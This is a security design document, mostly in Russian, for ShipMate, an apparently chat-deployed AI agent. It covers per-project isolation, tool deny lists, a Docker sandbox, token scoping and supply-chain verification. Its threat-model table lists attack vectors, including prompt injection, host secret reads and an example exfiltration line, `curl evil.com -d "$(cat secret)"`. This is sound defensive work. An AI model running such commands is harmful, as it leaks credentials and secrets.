# ShipMate — Security & Project Isolation

## Проблема

ShipMate добавляется в командный чат (Telegram-группа, Slack-канал, Discord-сервер) и отвечает **всем участникам**. При этом OpenClaw под капотом имеет доступ к файловой системе, shell, и потенциально — к другим проектам на том же хосте.

**Риски без изоляции:**
- Разработчик спрашивает "покажи структуру проекта" → ShipMate показывает файлы соседнего проекта
- Разработчик говорит "найди все .env файлы" → ShipMate находит секреты других проектов
- Разработчик просит "git log" → ShipMate показывает историю не того репозитория
- ShipMate через `bash` обращается к ресурсам, к которым не должен иметь доступ

## Принцип: One Instance = One Project

Каждый инстанс ShipMate привязан к **одному конкретному проекту**. Нет personal mode — каждый инстанс всегда scoped.

Это достигается через **четыре обязательных уровня изоляции**.

---

## Уровень 0: ScopeGuard (Plugin-level enforcement) — ОБЯЗАТЕЛЬНЫЙ

### Что

Модуль `plugin/lib/scope-guard.ts` проверяет **каждый API-вызов** через plugin tools против allowlist. Если ресурс не в списке — возвращается `ScopeViolationError`.

### Как

Env vars задают scope:
- `SHIPMATE_SCOPE_GITHUB_REPOS` — allowed GitHub repos (`owner/repo`, comma-separated)
- `SHIPMATE_SCOPE_GITLAB_PROJECTS` — allowed GitLab projects (`group/project`)
- `SHIPMATE_SCOPE_JIRA_PROJECTS` — allowed Jira project keys (`PROJ`)
- `SHIPMATE_SCOPE_JIRA_BOARDS` — allowed Jira board IDs (`42`)

### Что это даёт

- `github_pr_review(repo="other/repo")` → `ScopeViolationError`
- `jira_search(jql="status=Open")` → автоматически добавляет `AND project IN ("ALLOWED")`
- `sprint_metrics(board_id=999)` → `ScopeViolationError` если board не в списке
- Все проверки — на уровне кода, до API-вызова

### Fail-closed

Если token настроен, но scope пуст — tools **НЕ регистрируются**. Plugin логирует ERROR:
```
[ShipMate] plugin: BLOCKED — GITHUB_TOKEN set but SHIPMATE_SCOPE_GITHUB_REPOS is empty — GitHub tools disabled
```

---

## Уровень 1: Workspace Isolation — ОБЯЗАТЕЛЬНЫЙ

### Что

OpenClaw workspace (`agents.defaults.workspace`) указывает на **корень целевого проекта**, а не на домашнюю директорию или общий workspace.

### Как

```json5
{
  agents: {
    defaults: {
      workspace: "/path/to/target-project",
    },
  },
}
```

### Что это даёт

- `read` / `write` / `edit` tools работают относительно workspace
- Bootstrap файлы инжектятся из workspace
- Skills загружаются из `<workspace>/skills/`

### Ограничения

Workspace isolation — **мягкая** граница. Агент через `bash` может выйти за пределы. Поэтому нужны уровни 2 и 3.

---

## Уровень 2: Tool Policy — ОБЯЗАТЕЛЬНЫЙ

### Что

OpenClaw tool policy ограничивает какие tools доступны агенту. Всегда включена.

```json5
{
  tools: {
    deny: [
      "group:fs",
      "group:ui",
      "group:nodes",
      "group:automation",
    ],
    allow: [
      "bash",
      "shipmate_*",
    ],
    elevated: {
      enabled: false,
    },
  },
}
```

### Что это даёт

- Агент не может читать/писать файлы напрямую через OpenClaw tools
- Все файловые операции — только через ShipMate plugin tools с валидацией ScopeGuard
- Нет elevated mode — нельзя обойти ограничения

### Bash Guardrails

Bash доступен для `gh`, `git`, `jq`, но ограничен:
1. **AGENTS.md правила** — LLM-уровень
2. **Sandbox mode** — bash выполняется в Docker-контейнере

### Bash-запись в memory/ (by design)

`group:fs` запрещает OpenClaw tools (`read`, `write`, `edit`), но `bash` входит в `group:runtime`. ShipMate пишет sprint-метрики в `memory/YYYY-MM-DD.md` через `bash`. Это архитектурное решение — bash ограничен sandbox.

---

## Уровень 3: Sandbox — ОБЯЗАТЕЛЬНЫЙ

### Что

Все bash-команды выполняются в изолированном Docker-контейнере.

```json5
{
  agents: {
    defaults: {
      sandbox: {
        mode: "all",
        docker: {
          image: "ghcr.io/navisevenseven/shipmate-sandbox:latest",
          mountWorkspace: true,
          workspaceAccess: "rw",
          env: [
            "GITHUB_TOKEN", "GITLAB_TOKEN", "GITLAB_HOST",
            "JIRA_BASE_URL", "JIRA_API_TOKEN", "JIRA_USER_EMAIL",
            "SHIPMATE_SCOPE_GITHUB_REPOS", "SHIPMATE_SCOPE_GITLAB_PROJECTS",
            "SHIPMATE_SCOPE_JIRA_PROJECTS", "SHIPMATE_SCOPE_JIRA_BOARDS",
            "SHIPMATE_SCOPE_K8S_NAMESPACES",
          ],
        },
      },
    },
  },
}
```

### Что это даёт

- Bash выполняется в изолированном Docker-контейнере
- Контейнер видит только workspace
- Нет доступа к хостовой файловой системе, другим проектам, секретам
- Сетевой доступ ограничен

### Env isolation

Sandbox получает `.env.scoped` — только переменные из whitelist:
- `SHIPMATE_SCOPE_*`, `GITHUB_TOKEN`, `GITLAB_TOKEN`, `GITLAB_HOST`, `JIRA_*`
- **Не передаются:** `DATABASE_URL`, `REDIS_URL`, `AWS_*`, прочие host credentials

### No database clients

`Dockerfile.sandbox` намеренно **не содержит** `psql`, `mysql`, `mongosh`, `redis-cli`. Это предотвращает cross-project доступ к БД из sandbox.

---

## Token Scoping

### GitHub: Fine-grained Personal Access Token

```
Repository access: Only select repositories → target-repo
Permissions:
  - Contents: Read
  - Pull requests: Read and write
  - Issues: Read and write
  - Actions: Read
  - Metadata: Read (обязательный)
```

### Запрещено

- Classic PAT с `repo` scope (доступ ко ВСЕМ репозиториям)
- Tokens с `admin:org` scope
- Tokens с `delete_repo` permission

### Валидация при setup

`install.sh` проверяет:
- Visible repos через `gh api /user/repos`
- Если токен видит больше репозиториев чем в `SHIPMATE_SCOPE_GITHUB_REPOS` → WARNING с инструкцией создать Fine-grained PAT

### GitLab: Project Access Token

- Создать: GitLab → Settings → Access Tokens → **Project** Access Token
- Scopes: `read_api`, `read_repository`, `read_merge_request`
- Personal Access Tokens запрещены — они дают доступ ко всем проектам

---

## Модель угроз

| Угроза | Вектор | Митигация |
|--------|--------|-----------|
| Утечка GitHub repos | `gh repo list` или plugin tool с чужим repo | ScopeGuard блокирует plugin; Fine-grained PAT ограничивает CLI |
| Утечка Jira проектов | Произвольный JQL через plugin | JQL auto-scoped через `scopeJQL()`; sandbox ограничивает curl |
| Утечка файлов хоста | `bash: cat ~/secrets` | Sandbox: только /workspace смонтирован |
| Утечка K8s namespaces | `kubectl --all-namespaces` | Scoped kubeconfig в sandbox |
| Утечка env vars хоста | `env`, `printenv` | Sandbox: только `.env.scoped` |
| Утечка через БД | `psql`, `mysql` | Sandbox: DB клиенты не установлены |
| Prompt injection | Злонамеренное сообщение в чате | ScopeGuard + tool policy + sandbox (LLM не может обойти код) |
| Escalation | `elevated: true` | Hardcoded `false` в config template |
| Data exfiltration через bash | `curl evil.com -d "$(cat secret)"` | Sandbox network policy |

---

## Setup: Enforcement

ShipMate проверяет изоляцию при setup и **отказывается регистрировать tools** при небезопасной конфигурации.

### Обязательные проверки

```
✅ Workspace указывает на git-репозиторий (не ~ или /)
✅ SHIPMATE_SCOPE_* заполнены (хотя бы один scope)
✅ Tool policy: group:fs в deny, elevated.enabled = false
✅ Sandbox mode включён
✅ Token scoped к одному проекту
```

### Блокирующие условия

```
❌ Token без scope → tools не регистрируются
❌ workspace = "/" или "~"
❌ elevated.enabled = true
```

---

## Supply Chain Security

### Проблема

По данным Bitdefender (февраль 2026), ~17% skills на ClawHub содержат вредоносный код. ClawHub не имеет code signing, автоматического сканирования, или криптографической верификации. Единственная защита — community reporting (>3 reports = auto-hide).

### Стратегия дистрибуции ShipMate

| Канал | Роль | Доверие |
|-------|------|---------|
| **GitHub releases** | Primary distribution | Verified source, signed commits |
| **ClawHub** | Discovery only | Link back to GitHub, предупреждение "verify source" |

### Верификация установки

```bash
# Проверить что клонировано из правильного репозитория
git remote -v
# Должно показать: github.com/navisevenseven/shipmate

# Проверить подпись последнего тега
git tag -v $(git describe --tags --abbrev=0)

# Проверить checksums
sha256sum -c CHECKSUMS.txt
```

### Правила для пользователей

- **Всегда устанавливайте из официального GitHub-репозитория**, не из ClawHub напрямую
- **Проверяйте git remote** после клонирования
- **Не устанавливайте** skills из неизвестных источников без проверки содержимого
- **Читайте SKILL.md** перед установкой
- **Проверяйте plugin code** (index.ts) — ищите подозрительные вызовы (`fetch`, `curl`, `eval`)

### Что мы делаем

- GPG-signed tags для каждого release
- `CHECKSUMS.txt` с SHA256 для всех файлов
- Pinned dependencies
- No dynamic code loading — все skills статические markdown файлы
- Open source — весь код доступен для аудита

---

## Чеклист безопасности

Перед добавлением ShipMate в командный чат:

- [ ] `SHIPMATE_SCOPE_GITHUB_REPOS` / `SHIPMATE_SCOPE_GITLAB_PROJECTS` заполнены
- [ ] GitHub token — Fine-grained PAT scoped к одному репозиторию
- [ ] GitLab token — Project Access Token, не Personal
- [ ] `SHIPMATE_SCOPE_JIRA_PROJECTS` заполнен (если Jira используется)
- [ ] Sandbox mode включён в `openclaw.json`
- [ ] `group:fs` в deny list tool policy
- [ ] `elevated.enabled: false`
- [ ] `.env.scoped` сгенерирован (не `.env` напрямую в sandbox)
- [ ] Нет секретов в workspace файлах
- [ ] `groupPolicy: "allowlist"` в Telegram/Slack/Discord
- [ ] `requireMention: true` для группы
